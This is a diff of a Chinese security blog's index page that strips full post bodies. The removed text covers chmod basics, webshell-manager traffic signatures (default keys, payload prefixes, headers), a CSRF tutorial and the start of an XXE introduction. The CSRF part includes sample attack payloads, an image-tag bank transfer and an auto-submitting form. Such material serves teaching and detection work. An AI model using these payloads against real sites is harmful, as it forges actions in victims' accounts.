@@ -59,17 +59,7 @@
       
       
         <h2 id="Linux中chmod命令用于更改或分配文件的目录的权限"><a href="#Linux中chmod命令用于更改或分配文件的目录的权限" class="headerlink" title="Linux中chmod命令用于更改或分配文件的目录的权限"></a>Linux中chmod命令用于更改或分配文件的目录的权限</h2><ol>
-<li>chmod（change mode改变模式）命令用于改变Linux操作系统文件或目录的访问权限。用它控制文件或目录的访问权限。</li>
-<li>chmod命令有两种用法</li>
-</ol>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.一种是包含字母和操作符表达式的文字设定法。</span><br><span class="line">2.一种是包含数字的数字设定法。</span><br></pre></td></tr></table></figure>
-</blockquote>
-<ol start="3">
-<li>文件或目录的访问权限分为：只读，只写和可执行三种。</li>
-<li>有三种不同类型的用户可对文件或目录进行访问：文件所有者，同组用户、其他用户。所有者一般是文件的创建者。所有者可以允许同组用户有权访问文件，还可以将文件的访问权限赋予系统中的其他用户。在这种情况下，系统中每一位用户都能访问该用户拥有的文件或目录。</li>
-<li>在Linux操作系统中，文件和文件夹都有自己的属性和权限，分别为 文件所有者（u）、文件所属组（g）、其他用户（o）的读访问、写访问、执行访问权限，简称为 r、w、x 或者 4，2，1 表示。</li>
-</ol>
+<li><p>chmod（change mode改变模式）命令用于改变Linux操作系统文件或目录的访问权限。用它控制文件或目录的访问权限。</p>
       
     </div>
     
@@ -92,30 +82,12 @@
       
       
         <h2 id="Webshell管理工具的流量特征分析"><a href="#Webshell管理工具的流量特征分析" class="headerlink" title="Webshell管理工具的流量特征分析"></a>Webshell管理工具的流量特征分析</h2><h3 id="一、Webshell管理工具"><a href="#一、Webshell管理工具" class="headerlink" title="一、Webshell管理工具"></a>一、Webshell管理工具</h3><p>菜刀、蚁剑、冰蝎（2.0、3.0、4.0）、哥斯拉</p>
-<p>简单的来说，<strong>菜刀和蚁剑采用静态加密</strong>的方式，其流量的攻击特征较为明显，而<strong>冰蝎和哥斯拉采用了动态加密</strong>的方式，更容易绕过安全设备的检测。</p>
-<h4 id="1-菜刀"><a href="#1-菜刀" class="headerlink" title="1.菜刀"></a>1.菜刀</h4><blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.payload在请求体中，采用url编码+base64编码，payload部分是明文传输</span><br><span class="line">2.payload中有eval或assert、base64_decode这样的字符</span><br><span class="line">3.payload中有默认固定的&amp;z0=QGluaV9zZXQ...这样base64加密的攻击载荷，参数z0对应$_POST[z0]接收到的数据，且固定为QGluaV9zZXQ开头。进行base64解码后可看到代码：@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);这段意思是首先关闭报错和magic_quotes，接下来去获取主机的信息。</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4 id="2-蚁剑"><a href="#2-蚁剑" class="headerlink" title="2.蚁剑"></a>2.蚁剑</h4><blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.请求时可选择多种编码器，如果采用默认的方式，则仅进行url编码。</span><br><span class="line">2.进行连接时会进行两次请求，第一次请求的payload和菜刀相似，也是@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);意思是关闭报错和magic_quotes，接下来区获取主机信息。这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码。</span><br><span class="line">3.第二次请求会把主机的目录列出来。</span><br><span class="line">4.由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x.....=”这种形式（下划线可替换为其他）所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4 id="3-冰蝎"><a href="#3-冰蝎" class="headerlink" title="3.冰蝎"></a>3.冰蝎</h4><p><strong>冰蝎2.0</strong></p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 AES加密+base64编码发起三次请求。</span><br><span class="line">第一次GET请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的。第二次GET请求是为了获取密钥 key，服务端会生成16位的AES密钥。第三次使用 key 的AES加密进行通信，通信也采用了base64编码。</span><br><span class="line">进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><strong>冰蝎3.0</strong></p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用AES加密+base64编码发起两次请求。 </span><br><span class="line">与冰蝎2.0相比，冰蝎3.0取消了动态密钥获取的请求，AES的密钥直接固定为连接密码32位md5的前16位，默认连接密码是&quot;rebeyond&quot;(即密钥是md5(&#x27;rebeyond&#x27;)[0:16]=e45e329feb5d925b)。服务端和客户端不再进行密钥的交互传递。两次请求中，第一次请求用于判断是否可以建立连接。第二次发送 phpinfo 等代码执行，获取网站的信息。</span><br><span class="line">与冰蝎2.0相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。连接jsp的webshell的请求数据包中的content-type字段常见为application/octet-stream。</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><strong>冰蝎4.0</strong></p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.提供了传输协议自定义的功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。v4.0版本不再有连接密码的概念，自定义传输协议的算法就是连接密码。</span><br><span class="line">2.Accept字段（弱特征），通常是Accept: application/json, text/javascript, */*; q=0.01 意思是浏览器可接受任何文件，但最倾向application/json 和 text/javascript。</span><br><span class="line">3.Content-Type字段（弱特征），通常是Content-type: Application/x-www-form-urlencoded</span><br><span class="line">4.与冰蝎的前述版本相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。</span><br><span class="line">5.连接的端口有一定的特征，冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。</span><br><span class="line">6.使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive</span><br><span class="line">7.有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</span><br><span class="line">8.默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥，与冰蝎3.0相同。</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4 id="4-哥斯拉"><a href="#4-哥斯拉" class="headerlink" title="4.哥斯拉"></a>4.哥斯拉</h4><blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.支持多种加密，采用了和冰蝎 2.0 类似的密钥交换方式，哥斯拉建立连接时会发起三次请求，第一次请求数据超级长，用于建立 session，第二三次请求确认连接，第二、三次的请求和响应基本是一致的。</span><br><span class="line">2.User-Agent字段（弱特征），如果采用默认的情况，会暴露使用的jdk信息。不过哥斯拉支持自定义HTTP头部，这个默认特征是可以很容易去除的。</span><br><span class="line">3.Accept字段（弱特征），默认是Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2。同上，这个也可修改，只能作为辅助检测的特征。</span><br><span class="line">4.Cookie中有一个非常关键的特征，最后会有个分号。估计后续的版本会修复。</span><br><span class="line">5.响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。</span><br></pre></td></tr></table></figure></blockquote>
-
       
     </div>
+    
+      <div class="article-more-link">
+        <a href="/2023/09/21/Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/#more">read more</a>
+      </div>
     
     
     
@@ -132,114 +104,12 @@
       
       
         <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h3 id="一、什么是CSRF"><a href="#一、什么是CSRF" class="headerlink" title="一、什么是CSRF"></a>一、什么是CSRF</h3><p>​		CSRF（跨站请求伪造）也被称为客户端请求伪造，通常缩写为CSRF或者XSRF，它是以一种对网站的恶意利用。听起来有点像XSS（跨站脚本），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p>
-<p>​		简言之，就是攻击者通过一些技术手段欺骗用户的浏览器去访问一个受害则之前认证过的站点并运行一些操作（发邮件、发消息、甚至可以是财产操作（比如转账或者购买商品））。因为浏览器在之前已经对受害者认证过，所以被访问站点会觉得这是真正的用户在进行操作而去运行。</p>
-<h3 id="二、CSRF攻击原理及过程"><a href="#二、CSRF攻击原理及过程" class="headerlink" title="二、CSRF攻击原理及过程"></a>二、CSRF攻击原理及过程</h3><p>​		CSRF能攻击成功的本质原因就是重要的所有参数都是可以被攻击者猜测到的。攻击者只有猜测出URL的所有参数和参数值，就能构造出一个伪造的请求；反之，攻击者将无法攻击成功。</p>
-<p><img src="/CSRF.assets/image-20230921134900043.png" alt="image-20230921134900043"></p>
-<p>从上图流程可得知，要完整的进行一次CSRF攻击，受害者必须依次完成其中两个步骤：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.登入受信任站点A，并在本地生成cookie</span><br><span class="line">2.在不登出A的情况下去访问危急站点B</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>1.受害者通过账号密码登录并访问网站A</p>
-<p>2.网站A 验证受害者的账号密码，并生成一个sessionID，然后返回到客户端并存储在浏览器中</p>
-<p>3.随后该受害者访问由hacked控制的网站B</p>
-<p>4.网站B自动触发要求受害者端访问网站A（在网站B中有链接指向网站A）</p>
-<p>5.受害者通过网站B中的链接去访问网站A（此时受害者携带合法的sessionID进行访问网站A）</p>
-<p>5.网站A只需验证sessionID是否合法，合法则执行相应的操作（具体操作得看链接，以及网站B要求访问时携带的数据）</p>
-<p>所以在被CSRF攻击时，要同时必须满足两个条件：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登入受信任的网站A,并在本地生成cookie。</span><br><span class="line">在登出A的情况下，访问危险网站B</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3 id="三、CSRF分类"><a href="#三、CSRF分类" class="headerlink" title="三、CSRF分类"></a>三、CSRF分类</h3><p>​		CSRF，跟XSS漏洞攻击一样，存在着很大的危害性。可以理解成攻击者盗用了你的身份，再以你的名义发送恶意请求，对服务器来说这个请求完全时合法的，但是却完成了攻击者所期望的一个操作。比如以你的名义去发送邮件、发消息、盗取你的账号、添加系统管理员，甚至是购买商品、虚拟货币转账等等</p>
-<h4 id="1、GET型CSRF"><a href="#1、GET型CSRF" class="headerlink" title="1、GET型CSRF"></a>1、GET型CSRF</h4><p>​		仅仅需要一个HTTP请求，就能构造一次简单的CSRF</p>
-<p>例子：</p>
-<p>银行站点A：它以GET请求来完成一个银行转账的操作，如：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 </span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>危险站点B：它里面有一段HTML的代码：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>首先在你登录了银行站点A，然后再去访问危险站点B，这时你会发现你的银行账户少了一千大米</p>
-<p>原因是银行站点违反了HTTP规范，使用了GET请求更新资源</p>
-<p>在访问危险站点B之前，你已经登录了银行站点A，而B中的一个合法请求（这里被攻击者所利用）</p>
-<p>所有你的浏览器会带着你的银行站点A的cookie发出GET请求，去获取资源以GET的方式请求第三方资源（这里的第三方指银行站点）</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>银行站点服务器受到请求后，觉得这是一个更新资源的操作（转账操作），所有就立马执行了转账操作。</p>
-<h4 id="2、POST型CSRF"><a href="#2、POST型CSRF" class="headerlink" title="2、POST型CSRF"></a>2、POST型CSRF</h4><p>​		在CSRF攻击之初，曾经有一种错误的观点，认为CSRF攻击只能由GET请求发起。因此很多开发者认为只要把重要的操作改成只允许POST请求，就能防止CSRF攻击。</p>
-<p>​		这样的错误观点形成的原因主要在于，大多数CSRF攻击发起时，使用的HTML标签都是<image>、<iframe>、<sceipt>等带有”src”属性的标签，这类标签只能发起一次GET请求，而不能发起POST请求。</p>
-<p>​		而对于很多网站的应用来说，一些重要的操作并未严格的区分GET和POST，攻击者可以使用GET请求表单的提交地址。比如在PHP中，如果使用的时$_REQUEST， 而非$POST获取变量，则会存在这个问题。</p>
-<p>​		对于一个表单来说，用户往往也就使用GET方式提交参数</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot; / register&quot; id=&quot;register&quot; method=&quot;post&quot; &gt;</span><br><span class="line">&lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=submit name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>用户可以尝试构造一个GET请求</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http: //host/register?username=test&amp;password=passwd</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>若服务器端未对请求方法进行限制，则这个请求会通过。</p>
-<p>如果服务端区分了GET和POST，攻击者有若干种方法可以构造出一个POST请求</p>
-<p>最简单的方法就是在一个页面种构造好一个表单，然后使用JavaScript自动提交这个表单</p>
-<p>例子：</p>
-<p>在普通用户眼中，点击网页-&gt;打开试看视频-&gt;购买视频是一个很正常的一个流程。在攻击者的眼中可以算正常但又不正常的，不正常的情况下，是在开发者安全意识不足所造成的。攻击者在购买处抓到购买时网站处理购买用户余额的地址。比如</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/coures/user/handler666buy.php&lt;/font&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>通过提交表单，bug.php处理购买的信息，666为视频ID。那么攻击者现在构造一个链接，链接包含以下内容</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=/coures/user/handler/666/buy method=POST&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;xx&quot; value=&quot;xx&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>当用户访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作，自动购买了ID为666的视频，从而导致受害者余额扣除</p>
-<h4 id="四、CSRF漏洞挖掘"><a href="#四、CSRF漏洞挖掘" class="headerlink" title="四、CSRF漏洞挖掘"></a>四、CSRF漏洞挖掘</h4><p>1.最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</p>
-<p>2.如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞</p>
-<p>3.随着CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如：CSRFTester、CSRF Request Builder等。以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这就相当于一次伪造客户端请求</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞。</p>
-<h4 id="五、CSRF漏洞的防御"><a href="#五、CSRF漏洞的防御" class="headerlink" title="五、CSRF漏洞的防御"></a>五、CSRF漏洞的防御</h4><ol>
-<li><p><strong>验证码</strong></p>
-<p><strong>验证码被认为是对抗CSRF攻击最简洁而有效的防御方法。</strong></p>
-<p>CSRF攻击的过程，往往是用户在不知情的情况下构造了网络请求。验证码的存在强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击</p>
-<p>但是验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。</p>
-</li>
-<li><p><strong>在请求地址中添加token并验证</strong></p>
-<p>CDRF攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在与cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的cookie来通过安全验证。</p>
-<p>要抵御CSRF关键在于请求中放入攻击者不能伪造的信息，并且该信息不存在与cookie之中</p>
-<p><strong>可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器建立以恶搞拦截器来验证token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</strong></p>
-<p>对于GET请求，token将附在请求地址之后，这样URL就变成<a target="_blank" rel="noopener" href="http://url/?csrftoken=tokenvalue%E8%80%8C%E5%AF%B9%E4%BA%8EPOST%E8%AF%B7%E6%B1%82%E6%9D%A5%E8%AF%B4%EF%BC%8C%E8%A6%81%E5%9C%A8form%E7%9A%84%E6%9C%80%E5%90%8E%E5%8A%A0%E4%B8%8A%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E6%8A%8Atoken%E4%BB%A5%E5%8F%82%E6%95%B0%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8A%A0%E5%85%A5%E4%BA%86%E8%AF%B7%E6%B1%82%E3%80%82">http://url?csrftoken=tokenvalue而对于POST请求来说，要在form的最后加上，这样就把token以参数的形式加入了请求。</a></p>
-<p>但是，在一个网络中，可以接受请求的地方有很多，要对于每一个请求都加上token非常的麻烦，并且容易漏掉，通常使用的方法就是在每次页面加载时使用JavaScript遍历整个dom树，对于dom中所有的a和form标签后加入token。</p>
-<p>这样就可以解决大部分的请求，但是对于在页面加载之后动态生成的html代码，这种方法就没有了作用，还需要程序员在编码时手动添加token。</p>
-<p>该方法还有一个缺点就是难以保证token本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，攻击者可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上token，攻击者可以在自己的网站上得到这个token，并马上就可以发动CSRF攻击。</p>
-<p><strong>为了避免这一点，系统可以在添加token的时候增加一个判断，如果这个链接是链到增加本站的，就在后面添加token，如果是通向外网则不加。</strong></p>
-<p>不过，即使这个CSRFtoken不以参数的形式附加在请求之中，攻击者的网站也同样可以通过Referer来得到这个token值来发动CSRF攻击。这也是一些用户喜欢手动关闭浏览器Referer功能的原因。</p>
-</li>
-<li><p><strong>在HTTP头中自定义属性并验证</strong></p>
-<p>这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把token以参数的形式至于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过XMLhttpRequest这个类，可以一次性给所有该类请求加上CSRFtoken这个HTTP头属性，并把token值放入其中。</p>
-<p>这样解决了上种方法在请求中加入token的不便，同时通过XMLhttpRequest请求的地址不会被记录到浏览器的地址栏，也不用担心token会透过Referer泄露到其他网站中。</p>
-</li>
-<li><p><strong>验证HTTP Referer字段</strong></p>
-<p>根据 HTTP 协议，在 HTTP 头中有一个字段叫Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 ：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。</p>
-<p>这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。</p>
-<p><strong>因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</strong></p>
-<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
-<p><strong>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。</strong></p>
-<p>使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。</p>
-<p>事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
-<p><strong>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。</strong></p>
-<p>因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF攻击是攻击者利用用户的身份操作用户账户的一种攻击方式。设计CSRF的防御方案必须先理解CSRF攻击的原理和本质。我们通常使用Anti CSRF Token来防御CSRF攻击，在使用Token时，要注意Token的保密性和随机性。</p>
-</li>
-</ol>
-
       
     </div>
+    
+      <div class="article-more-link">
+        <a href="/2023/09/21/CSRF/#more">read more</a>
+      </div>
     
     
     
@@ -256,198 +126,12 @@
       
       
         <h3 id="一、XXE漏洞"><a href="#一、XXE漏洞" class="headerlink" title="一、XXE漏洞"></a>一、XXE漏洞</h3><p>1.XXE简介<br>XXE就是<strong>XML外部实体注入</strong>，当<strong>允许引用外部实体</strong>时，XML数据在传输中有可能被不法分子修改，导致服务器执行恶意插入的代码，从而导致恶意攻击者可以通过构造恶意内容对任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害</p>
-<p>2.XML的概念</p>
-<ul>
-<li>XML是可扩展的标记语言，设计用来对数据的传输和存储，<strong>结构就是树形结构，由标签构成</strong>，有点像HTML语言。</li>
-<li>XML是一种非常灵活的语言，没有固定的标签，所有标签都可以自定义</li>
-<li>通常XML被用于信息的传递和记录，因此XML经常被用于充当配置文件</li>
-</ul>
-<p>XML和HTML的区别</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;XML被设计用来传输和存储数据</span><br><span class="line">&gt;HTML被设计用来显示数据</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3 id="二、XML语法解析"><a href="#二、XML语法解析" class="headerlink" title="二、XML语法解析"></a>二、XML语法解析</h3><h4 id="1-XML基础语法"><a href="#1-XML基础语法" class="headerlink" title="1.XML基础语法"></a>1.XML基础语法</h4><blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;?xml version=’1.0’?&gt;					//声明XML解析器版本来解析</span><br><span class="line">&gt;&lt;person&gt;								//根元素，不一定是person</span><br><span class="line">&gt;&lt;name&gt;test&lt;/name&gt;						//子元素，意思就是name变量的值是test</span><br><span class="line">&gt;&lt;age&gt;20&lt;/age&gt;                           //同理</span><br><span class="line">&gt;&lt;/person&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>简单来说XML的语法中，<strong>标签就是变量名，标签里面的数据就是变量的值</strong></p>
-<p>但是有一个问题，当数据里出现尖括号是，就会造成XML数据的解析错误，如下</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;name&gt;&lt;admin&lt;name&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>因为XML语法中对写法规定了</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;在XML中某些单独字符，如引号&quot; &#x27;和尖括号都是不允许直接出现在XML文档中（不能直接使用上面这种方法来保存单独字符数据），因为XML解析的时候会分辨不清这种输入到底是数值还是标签</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>我们可以使用<strong>XML实体</strong>来保存这些带有特殊字符的数据</p>
-<h4 id="2-XML语法特性"><a href="#2-XML语法特性" class="headerlink" title="2.XML语法特性"></a>2.XML语法特性</h4><p>所有 XML 元素都须有关闭标签<br>XML 标签对大小写敏感<br>XML 必须正确地嵌套<br>XML 文档必须有根元素<br>XML 的属性值需要加引号<br>另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。</p>
-<h4 id="3-XML实体"><a href="#3-XML实体" class="headerlink" title="3.XML实体"></a>3.XML实体</h4><p>实体是一种简单的存储单元，可以理解成我们可以<strong>对XML变量一样进行赋值</strong>，并且在XML文档中不同的地方对他进行引用。实体在XML文档中的文档类型的定义部分（<strong>DTD</strong>）被单独定义描述。</p>
-<h6 id="一、XML的基本结构"><a href="#一、XML的基本结构" class="headerlink" title="一、XML的基本结构"></a>一、XML的基本结构</h6><p>XML的基本结构，由<strong>XML声明、DTD部分、XML部分</strong>，三部分组成</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27; ?&gt;		XML声明</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE person [</span><br><span class="line">&lt;!ENTITY name &quot;john&quot;&gt;		DTD部分</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;person&gt;</span><br><span class="line">&lt;name&gt;&amp;name;&lt;/name&gt;			XML部分</span><br><span class="line">&lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/person&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>DTD部分就是用来定义XML文档的合法构建模块的</p>
-<p>DTD部分又可叫根元素，XML部分又可叫子元素。根元素拥有子元素。</p>
-<p>所有元素都可以有文本内容和属性（类似HTML中）</p>
-<h5 id="二、实体"><a href="#二、实体" class="headerlink" title="二、实体"></a>二、实体</h5><p><strong>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</strong></p>
-<ul>
-<li>实体也分为三种，<strong>一般实体、参数实体，预定义实体</strong>（都是属于内部实体）</li>
-<li>实体可在内部或外部进行声明</li>
-</ul>
-<p><strong>1.内部实体和外部实体</strong></p>
